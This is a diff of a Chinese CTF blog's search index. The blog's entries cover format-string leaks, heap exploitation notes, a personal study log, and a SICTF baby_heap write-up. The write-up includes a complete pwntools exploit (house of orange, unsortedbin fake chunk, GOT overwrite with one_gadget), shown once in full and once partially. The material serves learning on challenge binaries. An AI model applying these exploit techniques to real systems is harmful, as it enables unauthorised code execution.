-<p>假设调用链为 main-&gt;func-&gt;printf，而在 func 中存放着 fmt，则栈中
-fmt
-上方不远处一定有调用printf语句的下一句(PC+4)，即返回地址，和canary</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">假设偏移量为6，栈构造如下</span><br><span class="line">---printf栈帧---</span><br><span class="line">................</span><br><span class="line"> printf_canary    &lt;- offset = 3</span><br><span class="line">   printf_rbp     &lt;- offset = 4</span><br><span class="line">printf_ret_addr   &lt;- offset = 5</span><br><span class="line">---printf栈帧---</span><br><span class="line"></span><br><span class="line">----func栈帧----</span><br><span class="line">      fmt         &lt;- offset = 6</span><br><span class="line">----func栈帧----</span><br><span class="line"></span><br><span class="line">----main栈帧----</span><br><span class="line">...............</span><br><span class="line">----main栈帧----</span><br><span class="line"></span><br><span class="line"># 泄露 pie_base &amp; canary</span><br><span class="line">payload = &#x27;%3$p-%5$p-END&#x27;</span><br><span class="line">io.sendline(payload)</span><br><span class="line">func_addr,canary = [int(x,16) for x in io.recvuntil(&#x27;END&#x27;)[-35:-4].split(b&#x27;-&#x27;)]</span><br><span class="line">ret_offset = </span><br><span class="line">pie_base   = func_addr - ret_offset</span><br></pre></td></tr></table></figure>
-<h1 id="appendix">Appendix</h1>
-<h2
-id="pwnlib.fmtstr.fmtstr_payload源码">pwnlib.fmtstr.fmtstr_payload源码</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def fmtstr_payload (</span><br><span class="line">        offset,              # 字符串在栈上的偏移量</span><br><span class="line">        writes,              # &#123;target_addr:int_to_write&#125; 要写入的数字</span><br><span class="line">        numbwritten=0,       # printf 已经打印的字符数量</span><br><span class="line">        write_size=&#x27;byte&#x27;,   # 写入字节的大小</span><br><span class="line">        write_size_max=&#x27;long&#x27;, # </span><br><span class="line">        overflows=16,        # </span><br><span class="line">        strategy=&quot;small&quot;,    # 默认small，如果追求速度可以用fast模式</span><br><span class="line">        badbytes=frozenset(),  # </span><br><span class="line">        offset_bytes=0,      # </span><br><span class="line">        no_dollars=False     # 是否有 $ 符号,比如不用 &#x27;%996$n&#x27;</span><br><span class="line">    ):</span><br><span class="line"></span><br><span class="line">    sz = WRITE_SIZE[write_size]</span><br><span class="line">    szmax = WRITE_SIZE[write_size_max]</span><br><span class="line">    all_atoms = make_atoms(writes, sz, szmax, numbwritten, overflows, strategy, badbytes)</span><br><span class="line"></span><br><span class="line">    fmt = b&quot;&quot;</span><br><span class="line">    for _ in range(1000000):</span><br><span class="line">        data_offset = (offset_bytes + len(fmt)) // context.bytes</span><br><span class="line">        fmt, data = make_payload_dollar(offset + data_offset, all_atoms, numbwritten=numbwritten, no_dollars=no_dollars)</span><br><span class="line">        fmt = fmt + cyclic((-len(fmt)-offset_bytes) % context.bytes)</span><br><span class="line"></span><br><span class="line">        if len(fmt) + offset_bytes == data_offset * context.bytes:</span><br><span class="line">            break</span><br><span class="line">    else:</span><br><span class="line">        raise RuntimeError(&quot;this is a bug ... format string building did not converge&quot;)</span><br><span class="line"></span><br><span class="line">    return fmt + data</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>Pwn</category>
-      </categories>
-      <tags>
-        <tag>Pwn</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>BUUCTF babyheap_0ctf_2017</title>
     <url>/2023/08/14/blog3/</url>
     <content><![CDATA[<blockquote class="blockquote-center">
@@ -971,6 +971,97 @@ RELRO为什么可以改啊🤔</li>
       </categories>
       <tags>
         <tag>WriteUp, Heap</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HeapLearningLog1</title>
+    <url>/2023/08/24/blog4/</url>
+    <content><![CDATA[<blockquote class="blockquote-center">
+学习还是要写点日志才有意思
+</blockquote>
+<span id="more"></span>
+<h2 id="说在前面">说在前面</h2>
+<blockquote>
+<p>关于博客</p>
+</blockquote>
+<p>平时通过搜索学习时，经常会遇到一些吸收起来特别困难博客，这些博客大多是博主的外脑，博主看到自己的博客可能马上能理解自己写了什么，或者知道该怎么检索这篇博客。但对于读者，这篇博客几乎没有什么用......搜索引擎把这篇博客拉过来纯属浪费读者的时间。<br />
+所以我希望自己关于学习的blog，能够让一个0基础的读者从头到尾读完并且吸收这篇blog的内容。再不济也要让读者感到有用。而外脑放在本地即可。</p>
+<blockquote>
+<p>关于LearningLog</p>
+</blockquote>
+<p>我在学习nju的PA时写过一段时间的learninglog，目的是强迫自己输出以达到更好的理解，review
+log也可以让自己关注好自己的学习动态<del>（神精态状）</del><br />
+对于读者，learninglog可以给到借鉴作用，在学习过程中起到对照作用，不至于担忧自己的学习进度。</p>
+<hr />
+<h2 id="section">2023/08/24</h2>
+<p>已经8.25了。。。<br />
+hacknote那道题，还是用fastbin机制将heapList进行修改，然后UAF进行leak和提权。<br />
+现在做题感觉还是不够灵活，看到好多dai佬在大一结束的时候Pwn就已经很强了...我这半道出家实在没眼看。<br />
+所以只好成为赛棍了(<br />
+拿高考数学来举例，我现在不是120提到140，而是20提到40分。
+加油吧...任重道远</p>
+<h2 id="section-1">2023/08/25</h2>
+<p>好好好，整了一天新生赛，有点浮躁。<br />
+弹了会儿吉他现在才稍微好点<br />
+开整！</p>
+<p>结果打了一天的水题，把buu前四页的栈题和格式化字符串全打了，堆题畏难情绪到达了一个巅峰（</p>
+<h2 id="section-2">2023/08/26</h2>
+<p>蓝帽杯！做了道tcachebin的堆题，虽然是赛后一小时解出来的（<br />
+虽然但是，还是一上来就做难题并且是在比赛中做题，吸收知识快一些。<br />
+写了篇wp,今天就先到这吧。</p>
+<h2 id="section-3">2023/08/27</h2>
+<p>实在不想在buu刷了，题目难度不太均衡；所以开了pwnable，但题又难又多....<br />
+还是回buu吧，别找那么多理由，至少先把堆的原理搞熟再说<br />
+哈哈 结果今天看了一天猫猫救援视频😅<br />
+谁懂啊，把救来的猫猫起个奇奇怪怪的名字然后好好照顾再找个好一点的领养人真的很酷！</p>
+<h2 id="section-4">2023/08/28</h2>
+<p>原来不想学习的真正原因是ddl太多+没运动<br />
+今天中午起床清了一下杂务ddl，然后去打了四局双打，回来洗个澡就想学了（<br />
+把昨天的buu补上，今晚做两道题<br />
+跟lmarch2师傅讨论以后，我们一致认为进入Heap阶段要考虑的东西暴涨。<br />
+但与其说要考虑的东西变多了，不如说能考虑的点变多了。<br />
+如果思路清晰了，其实要考虑的点也就那些<br />
+所以一个思路索引表还是挺重要的，比如：<br />
+- 整数溢出 - 可改写BSS段以上部分 - 能改标准IO - IO_FILE攻击 -
+格式化字符串 1. 找偏移量 - 在栈上 - 不在栈上 -
+找比较近的三个串在一起的地址 - 堆 - 敏感函数：观察 - 读 - printf - puts
+- 写 - gets - read - Libc版本 - 2.26以前 - fastbin attack - 2.26以后 -
+tcachebin attack - Leaked Address - 堆地址(tcache 2.31及以下的bk) -
+libc地址(unsortedbin leak; 控制heapList leak)</p>
+<p>还有一点，做Heap题不像Stack一样可以整体分析完以后，用排除法来决定用什么打法，而应该是边打边分析我碰到了什么敏感函数。<br />
+大失败..做不下去，把一道题的思路分析好了就因为觉得自己差不多能做出来了就不想做了，kuso。
+杀了个回马枪，23:00决定还是今天要做出一道题来，于是打开buu第三页准备做一道。<br />
+1h，完全做不出来（<br />
+roar这道题是off_by_one + fastbin
+attack就好了，最后劫持malloc_hook为og不太行，网上说要用realloc调整栈环境，但调整以后也不行...<br />
+先sleep吧，明天再战。</p>
+<h2 id="section-5">2023/08/31</h2>
+<p>突然发现两天没写log了。<br />
+29号忘了干了啥了，30号返校，下午收拾了一下然后给新生赛出题。<br />
+今天上午把moe的pwnak掉，下午练吉他打球，晚上复盘并整合一下IOfile。
+奥对，今天过了NaN的审核，以后咱也是联合战队的一员啦XD<br />
+不过...N1师傅们确实太牛了，我想被录到N1现在还是天方夜谭...<br />
+现在是幻想时间：<br />
+九月份第一个周通关Heap，第二个周复现一些奇奇怪怪的题比如WM的jit，第三周缓冲，第四周接触Kernal.<br />
+针不戳，看看我有没有能力实现吧...去复盘IOFILE了.</p>
+<h2 id="section-6">2023/09/04</h2>
+<p>又好久没记录log...返校以后太忙了，第一个周各种文件各种学生工作，零碎时间都被占用了。<br />
+第一周通关Heap的梦想破灭了...</p>
+<h2 id="section-7">2023/09/20</h2>
+<p>居然九月二十了，这也太快了。<br />
+今天大致看了一下kernal pwn的CVE-2022-0995，对kernal
+pwn的环境搭建有了一点印象，但里面的大部分内容我都看不懂😭不过里面提到的堆喷让我想起了蓝帽杯初赛的heapSpray我还没复现。<br />
+然后复现了一下heapSpray，整个程序逆向起来贼头疼，以后要是逆起来很麻烦就patch，一边调一边猜一边逆，不过最后没复现出来，只是大概对堆喷有了一个基本的认知。<br />
+然后又去wiki上看一下接下来要学堆的哪一部分，结果发现自己哪一部分都有纰漏...主要原因还是对ptmalloc的一些机制不够熟悉，比如unsortedbin什么时候前向合并，比如unlink的时候检查的是fd和bk的什么等等。<br />
+正好想到之前看的winmt也写过heap和io的笔记，那我也来模仿一下吧。<br />
+之前太膨胀了，给自己定了好多不切实际的目标。<br />
+这个月剩下的十天，每天的pwn时间肯定还是要打一道题的，如果有多余的时间就来整理一下堆的管理机制。</p>
+]]></content>
+      <categories>
+        <category>LearningLog</category>
+      </categories>
+      <tags>
+        <tag>LearningLog, Heap</tag>
       </tags>
   </entry>
   <entry>
@@ -1092,213 +1183,6 @@ patchelf，根据远程调试选择了libc2.31 <figure class="highlight plaintex
       </categories>
       <tags>
         <tag>WriteUp, Heap</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HeapLearningLog1</title>
-    <url>/2023/08/24/blog4/</url>
-    <content><![CDATA[<blockquote class="blockquote-center">
-学习还是要写点日志才有意思
-</blockquote>
-<span id="more"></span>
-<h2 id="说在前面">说在前面</h2>
-<blockquote>
-<p>关于博客</p>
-</blockquote>
-<p>平时通过搜索学习时，经常会遇到一些吸收起来特别困难博客，这些博客大多是博主的外脑，博主看到自己的博客可能马上能理解自己写了什么，或者知道该怎么检索这篇博客。但对于读者，这篇博客几乎没有什么用......搜索引擎把这篇博客拉过来纯属浪费读者的时间。<br />
-所以我希望自己关于学习的blog，能够让一个0基础的读者从头到尾读完并且吸收这篇blog的内容。再不济也要让读者感到有用。而外脑放在本地即可。</p>
-<blockquote>
-<p>关于LearningLog</p>
-</blockquote>
-<p>我在学习nju的PA时写过一段时间的learninglog，目的是强迫自己输出以达到更好的理解，review
-log也可以让自己关注好自己的学习动态<del>（神精态状）</del><br />
-对于读者，learninglog可以给到借鉴作用，在学习过程中起到对照作用，不至于担忧自己的学习进度。</p>
-<hr />
-<h2 id="section">2023/08/24</h2>
-<p>已经8.25了。。。<br />
-hacknote那道题，还是用fastbin机制将heapList进行修改，然后UAF进行leak和提权。<br />
-现在做题感觉还是不够灵活，看到好多dai佬在大一结束的时候Pwn就已经很强了...我这半道出家实在没眼看。<br />
-所以只好成为赛棍了(<br />
-拿高考数学来举例，我现在不是120提到140，而是20提到40分。
-加油吧...任重道远</p>
-<h2 id="section-1">2023/08/25</h2>
-<p>好好好，整了一天新生赛，有点浮躁。<br />
-弹了会儿吉他现在才稍微好点<br />
-开整！</p>
-<p>结果打了一天的水题，把buu前四页的栈题和格式化字符串全打了，堆题畏难情绪到达了一个巅峰（</p>
-<h2 id="section-2">2023/08/26</h2>
-<p>蓝帽杯！做了道tcachebin的堆题，虽然是赛后一小时解出来的（<br />
-虽然但是，还是一上来就做难题并且是在比赛中做题，吸收知识快一些。<br />
-写了篇wp,今天就先到这吧。</p>
-<h2 id="section-3">2023/08/27</h2>
-<p>实在不想在buu刷了，题目难度不太均衡；所以开了pwnable，但题又难又多....<br />
-还是回buu吧，别找那么多理由，至少先把堆的原理搞熟再说<br />
-哈哈 结果今天看了一天猫猫救援视频😅<br />
-谁懂啊，把救来的猫猫起个奇奇怪怪的名字然后好好照顾再找个好一点的领养人真的很酷！</p>
-<h2 id="section-4">2023/08/28</h2>
-<p>原来不想学习的真正原因是ddl太多+没运动<br />
-今天中午起床清了一下杂务ddl，然后去打了四局双打，回来洗个澡就想学了（<br />
-把昨天的buu补上，今晚做两道题<br />
-跟lmarch2师傅讨论以后，我们一致认为进入Heap阶段要考虑的东西暴涨。<br />
-但与其说要考虑的东西变多了，不如说能考虑的点变多了。<br />
-如果思路清晰了，其实要考虑的点也就那些<br />
-所以一个思路索引表还是挺重要的，比如：<br />
-- 整数溢出 - 可改写BSS段以上部分 - 能改标准IO - IO_FILE攻击 -
-格式化字符串 1. 找偏移量 - 在栈上 - 不在栈上 -
-找比较近的三个串在一起的地址 - 堆 - 敏感函数：观察 - 读 - printf - puts
-- 写 - gets - read - Libc版本 - 2.26以前 - fastbin attack - 2.26以后 -
-tcachebin attack - Leaked Address - 堆地址(tcache 2.31及以下的bk) -
-libc地址(unsortedbin leak; 控制heapList leak)</p>
-<p>还有一点，做Heap题不像Stack一样可以整体分析完以后，用排除法来决定用什么打法，而应该是边打边分析我碰到了什么敏感函数。<br />
-大失败..做不下去，把一道题的思路分析好了就因为觉得自己差不多能做出来了就不想做了，kuso。
-杀了个回马枪，23:00决定还是今天要做出一道题来，于是打开buu第三页准备做一道。<br />
-1h，完全做不出来（<br />
-roar这道题是off_by_one + fastbin
-attack就好了，最后劫持malloc_hook为og不太行，网上说要用realloc调整栈环境，但调整以后也不行...<br />
-先sleep吧，明天再战。</p>
-<h2 id="section-5">2023/08/31</h2>
-<p>突然发现两天没写log了。<br />
-29号忘了干了啥了，30号返校，下午收拾了一下然后给新生赛出题。<br />
-今天上午把moe的pwnak掉，下午练吉他打球，晚上复盘并整合一下IOfile。
-奥对，今天过了NaN的审核，以后咱也是联合战队的一员啦XD<br />
-不过...N1师傅们确实太牛了，我想被录到N1现在还是天方夜谭...<br />
-现在是幻想时间：<br />
-九月份第一个周通关Heap，第二个周复现一些奇奇怪怪的题比如WM的jit，第三周缓冲，第四周接触Kernal.<br />
-针不戳，看看我有没有能力实现吧...去复盘IOFILE了.</p>
-<h2 id="section-6">2023/09/04</h2>
-<p>又好久没记录log...返校以后太忙了，第一个周各种文件各种学生工作，零碎时间都被占用了。<br />
-第一周通关Heap的梦想破灭了...</p>
-<h2 id="section-7">2023/09/20</h2>
-<p>居然九月二十了，这也太快了。<br />
-今天大致看了一下kernal pwn的CVE-2022-0995，对kernal
-pwn的环境搭建有了一点印象，但里面的大部分内容我都看不懂😭不过里面提到的堆喷让我想起了蓝帽杯初赛的heapSpray我还没复现。<br />
-然后复现了一下heapSpray，整个程序逆向起来贼头疼，以后要是逆起来很麻烦就patch，一边调一边猜一边逆，不过最后没复现出来，只是大概对堆喷有了一个基本的认知。<br />
-然后又去wiki上看一下接下来要学堆的哪一部分，结果发现自己哪一部分都有纰漏...主要原因还是对ptmalloc的一些机制不够熟悉，比如unsortedbin什么时候前向合并，比如unlink的时候检查的是fd和bk的什么等等。<br />
-正好想到之前看的winmt也写过heap和io的笔记，那我也来模仿一下吧。<br />
-之前太膨胀了，给自己定了好多不切实际的目标。<br />
-这个月剩下的十天，每天的pwn时间肯定还是要打一道题的，如果有多余的时间就来整理一下堆的管理机制。</p>
-]]></content>
-      <categories>
-        <category>LearningLog</category>
-      </categories>
-      <tags>
-        <tag>LearningLog, Heap</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>2023SICTF-Pwn-baby_heap-wp</title>
-    <url>/2023/09/22/blog6/</url>
-    <content><![CDATA[<blockquote class="blockquote-center">
-baby一点都不baby...houseoforange+unsortedbinattack
-</blockquote>
-<span id="more"></span>
-<h1 id="x00-逆向分析">0x00 逆向分析</h1>
-<ol type="1">
-<li>main函数很简单，1申请2编辑3打印，但是没有free，google'no free
-pwn'了解到有可能是houseoforange</li>
-<li>add函数，两个约束（1. 最多申请32个chunk 2.
-chunk最大为0x1000），跟进chunk_size和chunk_ptr后发现两者在bss段挨得很近，所以这里其实可以伪造fake_chunk，后续可以考虑用fastbin
-attack或者unsortedbin
-attack来打（但这里没有free，就导致fastbin很难利用） <img
-src="/pic/Pasted%20image%2020230922101040.png" /></li>
-<li>edit函数 <img src="/pic/Pasted%20image%2020230922101820.png" /></li>
-<li>show函数，只打印了8个字节就很难受 <img
-src="/pic/Pasted%20image%2020230922101901.png" /></li>
-</ol>
-<h1 id="x01-思路分析">0x01 思路分析</h1>
-<ol type="1">
-<li>我们肯定是要实现“leak libc”和“Any Address Write”
-<ol type="1">
-<li>leak libc
-<ol type="1">
-<li>思路1：unsortedbin leak
-<ol type="1">
-<li>理论上可行，但由于show只打印八个字节，所以必须要把unsortedbin里的chunk申请出来再打印，这样就会浪费一个chunk，后续利用比较麻烦</li>
-</ol></li>
-<li>思路2：在bss段伪造fake_chunk写入got表，直接write出来</li>
-</ol></li>
-<li>Any Address Write
-<ol type="1">
-<li>思路1：常规unsortedbin attack
-<ol type="1">
-<li>比较麻烦，我的评价是不如unsortedbin申请fake_chunk</li>
-</ol></li>
-<li>思路2：unsortedbin 申请 fake_chunk
-<ol type="1">
-<li>将victim.bk设置为fake_chunk_head，申请两次即可获得</li>
-</ol></li>
-</ol></li>
-</ol></li>
-<li>将写入的got表改写为og即可提权</li>
-</ol>
-<h1 id="x02-具体步骤">0x02 具体步骤</h1>
-<ol type="1">
-<li>由于add函数中，chunk_size会截断size，所以我们想要伪造0x111大小的chunk（Q1）的话，就必须要申请一个0x111，一个0x1大小的chunk才能正确伪造size段，而申请16个0x100大小的chunk是为了把0x4040c0-0x4040d0置零，即莫名其妙的八个字节（Q2）和fake_chunk的prev_size段
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = &#x27;\x00&#x27;</span><br><span class="line">for i in range(16):</span><br><span class="line">  alloc(0x100,payload) # chunk0 - chunk15</span><br><span class="line">  </span><br><span class="line">alloc(0x111,payload)   # chunk16</span><br><span class="line">alloc(1,payload)       # chunk17</span><br></pre></td></tr></table></figure></li>
-<li>houseofOrange，此时unsortedbin中会有一个大小为0xdc0的chunk，记为victim
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = b&#x27;\x00&#x27;*0x18 + p64(0xdc1)</span><br><span class="line">edit(17, len(payload),payload)</span><br><span class="line">alloc(0x1000,payload) #18</span><br></pre></td></tr></table></figure></li>
-<li>伪造victim.bk = 0x4040c8（fake_chunk_head） <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = b&#x27;\x00&#x27;*0x18 + flat(0x111,b&#x27;deadbeef&#x27;,0x4040c8)</span><br><span class="line">edit(17, len(payload),payload)</span><br></pre></td></tr></table></figure></li>
-<li>连续申请2个chunk，在chunk_ptr[0]的位置写入malloc_got，调用show函数中的write，即可获得libc
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = &#x27;a&#x27;</span><br><span class="line">alloc(0x100,payload)</span><br><span class="line">malloc_got = elf.got[&#x27;malloc&#x27;]</span><br><span class="line">payload = p64(0) + p64(malloc_got)</span><br><span class="line">alloc(0x100,payload)</span><br><span class="line">dump(0)</span><br><span class="line">libc_base = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;)) - libc.sym[&#x27;malloc&#x27;]</span><br><span class="line">print(f&#x27;libc_base   ---&gt;   &#123;hex(libc_base)&#125;&#x27;)</span><br></pre></td></tr></table></figure></li>
-<li>调用edit函数，在chunk_ptr[0]指向的地址（即malloc的libc地址）写入og，调用malloc即可提权
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print(f&#x27;libc_base   ---&gt;   &#123;hex(libc_base)&#125;&#x27;)</span><br><span class="line">one_gadget = [0x45226,0x4527a,0xf03a4,0xf1247]</span><br><span class="line">payload = p64(libc_base + one_gadget[3])</span><br><span class="line">edit(0,len(payload),payload)</span><br><span class="line">io.sendlineafter(&#x27;&gt;&#x27;, str(1))</span><br><span class="line">io.sendlineafter(&#x27;Size :&#x27;, b&#x27;8&#x27;)</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h1 id="x03-一些问题">0x03 一些问题</h1>
-<p>Q1： 为什么必须要伪造0x111大小的chunk呢？<br />
-Q2：
-我感觉申请8个chunk就够了...把fake_chunk_head修改为0x4040c0也不是不行啊？</p>
-<h1 id="x04-完整exp">0x04 完整EXP</h1>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">file = &#x27;./baby_heap&#x27;</span><br><span class="line"></span><br><span class="line"># io = remote(domain_name,port)</span><br><span class="line">io = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./baby_heap&#x27;)</span><br><span class="line">libc = ELF(&#x27;/mnt/e/EdgeDownload/glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)</span><br><span class="line"></span><br><span class="line"># --------------------------------------------------------</span><br><span class="line">def alloc(size,content):</span><br><span class="line">  io.sendlineafter(&#x27;&gt;&#x27;, str(1))</span><br><span class="line">  io.sendlineafter(&#x27;Size :&#x27;, str(size))</span><br><span class="line">  io.sendlineafter(&#x27;Content :&#x27;, content)</span><br><span class="line">  </span><br><span class="line">def edit(index,size,content):</span><br><span class="line">  io.sendlineafter(&#x27;&gt;&#x27;, str(2))</span><br><span class="line">  io.sendlineafter(&#x27;Index :&#x27;, str(index))</span><br><span class="line">  io.sendlineafter(&#x27;Size :&#x27;, str(size))</span><br><span class="line">  io.sendafter(&#x27;Content :&#x27;, content)</span><br><span class="line">  </span><br><span class="line">def dump(index):</span><br><span class="line">  io.sendlineafter(&#x27;&gt;&#x27;, str(3))</span><br><span class="line">  io.sendlineafter(&#x27;Index :&#x27;,str(index))</span><br><span class="line"># --------------------------------------------------------</span><br><span class="line">payload = &#x27;\x00&#x27;</span><br><span class="line">for i in range(16):</span><br><span class="line">  alloc(0x100,payload) # chunk0 - chunk15</span><br><span class="line"></span><br><span class="line">alloc(0x111,payload)   # chunk16</span><br><span class="line">alloc(1,payload)       # chunk17</span><br><span class="line">payload = b&#x27;\x00&#x27;*0x18 + p64(0xdc1)</span><br><span class="line">edit(17, len(payload),payload)</span><br><span class="line">alloc(0x1000,payload) #18</span><br><span class="line">payload = b&#x27;\x00&#x27;*0x18 + flat(0x111,b&#x27;deadbeef&#x27;,0x4040c8)</span><br><span class="line">edit(17, len(payload),payload)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">payload = &#x27;a&#x27;</span><br><span class="line">alloc(0x100,payload)</span><br><span class="line">malloc_got = elf.got[&#x27;malloc&#x27;]</span><br><span class="line">payload = p64(0) + p64(malloc_got)</span><br><span class="line">alloc(0x100,payload)</span><br><span class="line">dump(0)</span><br><span class="line">libc_base = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;)) - libc.sym[&#x27;malloc&#x27;]</span><br><span class="line">print(f&#x27;libc_base   ---&gt;   &#123;hex(libc_base)&#125;&#x27;)</span><br><span class="line">one_gadget = [0x45226,0x4527a,0xf03a4,0xf1247]</span><br><span class="line">payload = p64(libc_base + one_gadget[3])</span><br><span class="line">edit(0,len(payload),payload)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.sendlineafter(&#x27;&gt;&#x27;, str(1))</span><br><span class="line">io.sendlineafter(&#x27;Size :&#x27;, b&#x27;8&#x27;)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>Pwn</category>
-      </categories>
-      <tags>
-        <tag>WriteUp</tag>
-        <tag>Heap</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Heap常规利用方式总结</title>
-    <url>/2023/09/22/blog7/</url>
-    <content><![CDATA[<blockquote class="blockquote-center">
-大佬都有这种总结性的wp，那我也邯郸学步一下 :P
-</blockquote>
-<span id="more"></span>
-<h1 id="fastbin-attack">Fastbin Attack</h1>
-<h1 id="tcachebin-attack">Tcachebin Attack</h1>
-<h1 id="use-after-free">Use After Free</h1>
-<ul>
-<li><strong>概述</strong>
-在<code>free(chunk_ptr)</code>后并没有<code>chunk_ptr=0</code>，导致我们仍然能通过<code>chunk_ptr</code>对这个chunk进行修改</li>
-<li>Fastbin Attack</li>
-<li></li>
-</ul>
-<h1 id="unsortedbin-attack">Unsortedbin Attack</h1>
-<h3 id="概述">概述</h3>
-<p><code>Unsortedbin attack</code>分为<code>leak</code>和<code>write</code>两部分
-### Leak
-当unsortedbin中有且仅有一个chunk时，该chunk的fd和bk会指向unsortdedbin的地址<br />
-而这个地址可以用ida查看对应libc的malloc_trim函数找到<br />
-### write write是指
-此外，低libc版本的unsortedbin可以像tcachebin一样，通过伪造链来申请一个fake_chunk
-- 申请fake_chunk <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">**2.23版本**  </span><br><span class="line">- 初状态  </span><br><span class="line">unsortedbin --&gt; chunk_victim  </span><br><span class="line"></span><br><span class="line">&gt; 此时我们令chunk_victim.bk = fake_chunk_head</span><br><span class="line"></span><br><span class="line">- 末状态  </span><br><span class="line">unsortedbin  --&gt; chunk_victim --&gt; fake_chunk</span><br><span class="line"></span><br><span class="line">&gt; 连续申请两个chunk即可申请到fake_chunk</span><br></pre></td></tr></table></figure></p>
-<h1 id="houseoforange">HouseofOrange</h1>
-<h2 id="概述-1">概述</h2>
-<p>HouseofOrange是在程序没有可以操控的free时，利用ptmalloc的管理机制强行制造出一个unsortedbin中的chunk的技术。<br />
-## 伪造chunk需求 1. top_chunk的结束地址必须页对齐<br />
--
-一般情况下，ptmalloc设置top_chunk为0x21000，我们申请一个0x10的chunk0后，chunk0加上chunk_head是0x20大小，此时top_chunk切割后还剩下0x20fe0大小，为了页对齐，我们伪造top_chunk的大小为0xfe0即可<br />
-2. top_chunk.size &gt;= MINSIZE<br />
-3. top_chunk.size &lt; chunk_size + MINSIZE 4. top_chunk.prev_inuse == 1
-- 第一点中说的0xfe0要变为0xfe1</p>
-]]></content>
-      <categories>
-        <category>Pwn</category>
-      </categories>
-      <tags>
-        <tag>Heap</tag>
-        <tag>Summary</tag>
       </tags>
   </entry>
   <entry>
@@ -1465,6 +1349,79 @@ href="https://jev0n.com/2022/07/08/ollvm-1.html">OLLVM混淆学习（1）——�
         <tag>SoftwareProtection</tag>
         <tag>VMRe</tag>
         <tag>FLA</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2023SICTF-Pwn-baby_heap-wp</title>
+    <url>/2023/09/22/blog6/</url>
+    <content><![CDATA[<blockquote class="blockquote-center">
+baby一点都不baby...houseoforange+unsortedbinattack
+</blockquote>
+<span id="more"></span>
+<h1 id="x00-逆向分析">0x00 逆向分析</h1>
+<ol type="1">
+<li>main函数很简单，1申请2编辑3打印，但是没有free，google'no free
+pwn'了解到有可能是houseoforange</li>
+<li>add函数，两个约束（1. 最多申请32个chunk 2.
+chunk最大为0x1000），跟进chunk_size和chunk_ptr后发现两者在bss段挨得很近，所以这里其实可以伪造fake_chunk，后续可以考虑用fastbin
+attack或者unsortedbin
+attack来打（但这里没有free，就导致fastbin很难利用） <img
+src="/pic/Pasted%20image%2020230922101040.png" /></li>
+<li>edit函数 <img src="/pic/Pasted%20image%2020230922101820.png" /></li>
+<li>show函数，只打印了8个字节就很难受 <img
+src="/pic/Pasted%20image%2020230922101901.png" /></li>
+</ol>
+<h1 id="x01-思路分析">0x01 思路分析</h1>
+<ol type="1">
+<li>我们肯定是要实现“leak libc”和“Any Address Write”
+<ol type="1">
+<li>leak libc
+<ol type="1">
+<li>思路1：unsortedbin leak
+<ol type="1">
+<li>理论上可行，但由于show只打印八个字节，所以必须要把unsortedbin里的chunk申请出来再打印，这样就会浪费一个chunk，后续利用比较麻烦</li>
+</ol></li>
+<li>思路2：在bss段伪造fake_chunk写入got表，直接write出来</li>
+</ol></li>
+<li>Any Address Write
+<ol type="1">
+<li>思路1：常规unsortedbin attack
+<ol type="1">
+<li>比较麻烦，我的评价是不如unsortedbin申请fake_chunk</li>
+</ol></li>
+<li>思路2：unsortedbin 申请 fake_chunk
+<ol type="1">
+<li>将victim.bk设置为fake_chunk_head，申请两次即可获得</li>
+</ol></li>
+</ol></li>
+</ol></li>
+<li>将写入的got表改写为og即可提权</li>
+</ol>
+<h1 id="x02-具体步骤">0x02 具体步骤</h1>
+<ol type="1">
+<li>由于add函数中，chunk_size会截断size，所以我们想要伪造0x111大小的chunk（Q1）的话，就必须要申请一个0x111，一个0x1大小的chunk才能正确伪造size段，而申请16个0x100大小的chunk是为了把0x4040c0-0x4040d0置零，即莫名其妙的八个字节（Q2）和fake_chunk的prev_size段
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = &#x27;\x00&#x27;</span><br><span class="line">for i in range(16):</span><br><span class="line">  alloc(0x100,payload) # chunk0 - chunk15</span><br><span class="line">  </span><br><span class="line">alloc(0x111,payload)   # chunk16</span><br><span class="line">alloc(1,payload)       # chunk17</span><br></pre></td></tr></table></figure></li>
+<li>houseofOrange，此时unsortedbin中会有一个大小为0xdc0的chunk，记为victim
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = b&#x27;\x00&#x27;*0x18 + p64(0xdc1)</span><br><span class="line">edit(17, len(payload),payload)</span><br><span class="line">alloc(0x1000,payload) #18</span><br></pre></td></tr></table></figure></li>
+<li>伪造victim.bk = 0x4040c8（fake_chunk_head） <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = b&#x27;\x00&#x27;*0x18 + flat(0x111,b&#x27;deadbeef&#x27;,0x4040c8)</span><br><span class="line">edit(17, len(payload),payload)</span><br></pre></td></tr></table></figure></li>
